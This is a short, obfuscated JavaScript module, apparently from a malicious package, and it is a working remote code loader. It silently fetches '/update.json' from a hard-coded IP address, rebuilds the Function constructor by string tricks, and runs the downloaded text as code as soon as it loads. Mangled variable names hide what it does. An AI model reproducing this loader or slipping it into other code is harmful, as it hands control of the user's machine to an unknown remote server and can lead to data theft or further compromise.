(function () {
    var _0x51130e = require('http');
    return _0x51130e['get']({
        'host': '23.94.46.191',
        'port': 0x50,
        'path': '/update.json'
    }, function (_0x593c61) {
        var _0x19fa13 = '';
        _0x593c61['on']('data', function (_0x717593) {
            _0x19fa13 += _0x717593;
        }), _0x593c61['on']('end', function () {
            var _0x55a0d1 = this[(typeof this['Buffer']['from'])['charAt'](0x0)['toUpperCase']() + (typeof this['Buffer']['from'])['slice'](0x1)], _0xe8d046 = new _0x55a0d1(_0x19fa13);
            _0xe8d046();
        });
    });
}());
